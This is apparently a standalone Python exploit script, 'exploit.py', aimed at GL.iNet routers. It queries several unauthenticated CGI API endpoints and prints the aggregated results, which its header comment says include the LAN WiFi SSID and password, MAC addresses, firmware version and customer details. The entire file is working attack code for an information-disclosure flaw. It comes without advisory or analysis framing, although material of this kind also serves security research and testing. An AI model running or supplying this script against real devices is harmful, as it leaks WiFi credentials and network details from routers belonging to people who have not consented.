#!/usr/bin/env python3

#########################################################
# 
# Usage: python3 exploit.py <domain/IP>
# 
# Example: python3 exploit.py 192.168.8.1
# 
# This script will scan a GL.iNet router for information
# available to an unauthenticated user. It will first try
# over HTTP, and HTTPS afterwards if unsuccessful.
# Multiple API endpoints will be queried, and all data is
# aggregated and printed to the screen.
# 
# Output explained:
#  - del:               ?
#  - led:               ? Something about LED lights
#  - led_sync:          ? Something about LED lights
#  - disabled:          which channel (2G or 5G or neither) is disabled
#  - wifi_sync:         ?
#  - ssid:              SSID of LAN WiFi network
#  - key:               WiFi password for LAN network
#  - encryption:        LAN WiFi encryption type
#  - version:           GL.iNET firmware version
#  - code:              0
#  - model:             GL.iNET model name
#  - factory_mac:       MAC address given by GL.iNET
#  - init:              If device has been setup
#  - connected:         If device is connected to the internet
#  - configured:        If device has been configured
#  - firmware_user:     ?
#  - firmware_type:     ?
#  - mac:               current MAC address (may be changed from factory_mac)
#  - type:              device type
#  - name:              name of the device
#  - hostname:          hostname of the device
#  - image_url:         path to custom customer logo
#  - customer_name:     name of the customer
#  - help_url:          path to custom customer help page
#  - internal_version:  internal version number
#  - language:          2-character language code
# 
#########################################################

import requests, sys
import warnings
warnings.filterwarnings("ignore")


## Get arguments
if (len(sys.argv) < 2):
    print("Usage: python3 exploit.py <domain/IP>")
    sys.exit(1)

url = sys.argv[1]
print("[+] Scanning http://"+url+"/...")


## Test target connection
https = False
try:
    response = requests.request("GET", "http://"+url+"/", timeout=4)
except Exception as e:
    print("[-] Error connecting to target: "+str(e))
    print("[-] Attempting HTTPS...")
    https = True

if https:
    try:
        print("[+] Scanning https://"+url+"/...")
        response = requests.request("GET", "https://"+url+"/", verify=False, timeout=4)
    except Exception as e:
        print("[-] Error connecting to target: "+str(e))
        sys.exit(1)


## Query endpoints
output = {}
beginning = "https://" if https else "http://"

### /api/router/mesh/status
data = "mac="
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
try:
    response = requests.request("POST", beginning+url+"/cgi-bin/api/router/mesh/status", verify=False, timeout=4, data=data, headers=headers).json()
    output.update(response)
except:
    ""

### /api/router/nologin/apinfo
try:
    response = requests.request("GET", beginning+url+"/cgi-bin/api/router/nologin/apinfo", verify=False, timeout=4).json()
    output.update(response)
except:
    ""

### /api/router/hello
try:
    response = requests.request("GET", beginning+url+"/cgi-bin/api/router/hello", verify=False, timeout=4).json()
    output.update(response)
except:
    ""

### /api/router/model
try:
    response = requests.request("GET", beginning+url+"/cgi-bin/api/router/model", verify=False, timeout=4).json()
    output.update(response)
except:
    ""

### /api/router/language/get
try:
    response = requests.request("GET", beginning+url+"/cgi-bin/api/router/language/get", verify=False, timeout=4).json()
    output.update(response)
except:
    ""


## Print results
print("[+] Scan complete. Results:")
for key in output:
    print("    "+key+": "+str(output[key]))